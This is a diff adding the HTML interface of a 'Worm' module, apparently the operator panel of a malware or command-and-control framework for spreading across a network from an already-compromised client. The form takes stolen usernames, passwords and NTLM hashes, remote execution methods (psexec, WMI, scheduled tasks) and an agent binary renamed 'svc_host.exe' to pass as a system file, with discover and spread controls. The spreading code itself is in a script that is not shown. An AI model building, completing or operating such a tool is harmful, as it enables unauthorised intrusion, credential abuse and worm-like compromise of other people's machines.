@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Worm</title>
+  <link rel="stylesheet" href="worm.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Worm</h1>
+    <span class="tag">lateral spreader</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>source client</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost" title="refresh clients">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">no clients seen yet</div>
+        <div class="hint">spread runs <em>from</em> this host — it uses that machine's network position and credentials.</div>
+      </div>
+
+      <div class="card">
+        <h2>credentials</h2>
+        <label for="users">users (one per line, blank = current user)</label>
+        <textarea id="users" rows="3" placeholder="CORP\Administrator&#10;."></textarea>
+
+        <label for="secrets">passwords / hashes (one per line)</label>
+        <textarea id="secrets" rows="4" placeholder="Password123&#10;hash:8846f7eaee8fb117ad06bdd830b7586c"></textarea>
+        <div class="hint">prefix an NTLM hash with <code>hash:</code></div>
+
+        <label for="methods">methods (in order)</label>
+        <input id="methods" value="psexec,wmi,schtasks" />
+        <div class="hint">psexec = service control manager, wmi = DCOM Win32_Process, schtasks = scheduled task</div>
+
+        <label for="maxHosts">max hosts per run</label>
+        <input id="maxHosts" type="number" value="32" min="1" max="512" />
+      </div>
+
+      <div class="card">
+        <h2>payload</h2>
+        <label for="payloadName">remote filename</label>
+        <input id="payloadName" value="svc_host.exe" />
+        <label for="payloadFile">agent binary</label>
+        <input id="payloadFile" type="file" />
+        <div id="payloadInfo" class="hint">no payload loaded — spread will fail without one</div>
+      </div>
+
+      <div class="card">
+        <h2>actions</h2>
+        <div class="actions">
+          <button id="discover" class="btn ghost">discover</button>
+          <button id="spread" class="btn danger">spread</button>
+        </div>
+        <button id="stopSpread" class="btn block">stop</button>
+        <div id="progressWrap" class="progress-wrap">
+          <div id="progressBar"><div id="progressFill"></div></div>
+          <div id="progressText" class="hint">0 / 0</div>
+        </div>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card grow">
+        <h2>targets</h2>
+        <table class="targets">
+          <thead>
+            <tr><th>host</th><th>ports</th><th>status</th><th>detail</th></tr>
+          </thead>
+          <tbody id="targetBody"></tbody>
+        </table>
+        <div id="empty" class="empty">no targets — run discover</div>
+      </div>
+
+      <div class="card">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="worm.js"></script>
+</body>
+</html>
